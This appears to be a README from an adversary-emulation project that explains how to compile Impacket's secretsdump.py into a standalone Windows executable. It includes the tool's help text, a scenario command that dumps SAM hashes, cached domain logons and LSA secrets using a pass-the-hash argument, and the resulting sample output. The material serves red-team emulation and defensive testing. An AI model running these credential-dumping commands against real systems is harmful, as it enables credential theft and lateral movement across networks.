# Impacket for secretsdump.exe

This is a slightly modified version of Fortra's [Impacket](https://github.com/fortra/impacket/tree/master) at [commit 2de29184dc93247829099fcbc52ff256817c6a94](https://github.com/fortra/impacket/tree/2de29184dc93247829099fcbc52ff256817c6a94).
- The original license can be found [here](https://github.com/fortra/impacket/blob/master/LICENSE) and on the [original Github](https://github.com/fortra/impacket/tree/master).
- The original README can be found [here](https://github.com/fortra/impacket/blob/master/README.md) and on the [original Github](https://github.com/fortra/impacket/tree/master).

The following modifications have been made to the library for compatability in building secretsdump.exe via PyInstaller:
* Renamed `impacket\http.py` to `impacket\impacket_http.py`
* Edited `impacket\dcerpc\v5\rpch.py` import of `impacket.http` to `impacket.impacket_http`

## Usage

Command line arguments and usage of the compiled secretsdump.exe is the same as its Python counterpart.

```cmd
secretsdump.exe -h
```

```cmd
Impacket v0.11.0 - Copyright 2023 Fortra

usage: secretsdump.exe [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM] [-ntds NTDS] [-resumefile RESUMEFILE] [-outputfile OUTPUTFILE] [-use-vss] [-rodcNo RODCNO]
                       [-rodcKey RODCKEY] [-use-keylist] [-exec-method [{smbexec,wmiexec,mmcexec}]] [-just-dc-user USERNAME] [-ldapfilter LDAPFILTER] [-just-dc] [-just-dc-ntlm] [-pwd-last-set] [-user-status]
                       [-history] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address]
                       target

Performs various techniques to dump secrets from the remote machine without executing any agent there.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address> or LOCAL (if you want to parse local files)

options:
  -h, --help            show this help message and exit
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -system SYSTEM        SYSTEM hive to parse
  -bootkey BOOTKEY      bootkey for SYSTEM hive
  -security SECURITY    SECURITY hive to parse
  -sam SAM              SAM hive to parse
  -ntds NTDS            NTDS.DIT file to parse
  -resumefile RESUMEFILE
                        resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep updating the session's state
  -outputfile OUTPUTFILE
                        base output filename. Extensions will be added for sam, secrets, cached and ntds
  -use-vss              Use the VSS method instead of default DRSUAPI
  -rodcNo RODCNO        Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)
  -rodcKey RODCKEY      AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)
  -use-keylist          Use the Kerb-Key-List method instead of default DRSUAPI
  -exec-method [{smbexec,wmiexec,mmcexec}]
                        Remote exec method to use at target (only when using -use-vss). Default: smbexec

display options:
  -just-dc-user USERNAME
                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch
  -ldapfilter LDAPFILTER
                        Extract only NTDS.DIT data for specific users based on an LDAP filter. Only available for DRSUAPI approach. Implies also -just-dc switch
  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
  -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)
  -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data
  -user-status          Display whether or not the user is disabled
  -history              Dump password history, and LSA secrets OldVal

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command
                        line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
```

In the menuPass scenario, secretsdump.exe is ingressed and executed by SodaMaster. The following is the executed command line arguments to dump local SAM hashes, cached domain login information, and LSA secrets: 

```cmd
secretsdump.exe [domain]/[admin username]@127.0.0.1 -hashes :[admin NTLM]
```

```cmd
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: ...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
...
[*] Dumping cached domain logon information (domain/username:hash)
...
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
...
[*] DefaultPassword
...
[*] DPAPI_SYSTEM
...
[*] NL$KM
...
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

## Build Instructions

### Build Environment Setup

The following steps will walk through setup of the build environment.

1. Open a Command Prompt with administrative privileges to install python (minimum Python 3.12)

    ```cmd
    choco install python
    ```

1. From menu_pass/Resources/impacket, create a Python virtual environment

    ```cmd
    python -m venv impacket-venv
    ```

1. Activate the virtual environment

    ```cmd
    impacket-venv\Scripts\activate.bat
    ```

1. Install pip (minimum Pip 23.2.1) then use pip to install pyinstaller and impacket

    ```cmd
    python -m pip install -U pip
    pip install pyinstaller
    pip install impacket
    ```

1. Manually edit pip installed impacket library. This deconflicts with Python's built in HTTP package
    1. Rename `impacket-venv\Lib\site-packages\impacket\http.py` to `impacket-venv\Lib\site-packages\impacket\impacket_http.py`
    1. Edit `impacket-venv\Lib\site-packages\impacket\dcerpc\v5\rpch.py` import of `impacket.http` to `impacket.impacket_http`

1. Add `C:\Windows\system32\downlevel` to `PATH` to ensure api-ms-win-crt...dll dependencies can be found

    ```cmd
    set PATH=%PATH%;C:\Windows\System32\downlevel;
    ```

### PyInstaller Build Command

1. Build secretsdump.exe using pyinstaller. This will create a `build` and a `dist` directory in the current working directory.
    ```cmd
    pyinstaller examples\secretsdump.py --onefile --path impacket
    ```

1. Test execution of secretsdump.exe

    ```
    cd dist
    secretsdump.exe -h
    ```

## CTI Reporting
[PwC - Operation Cloud Hopper: Technical Annex](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=28)
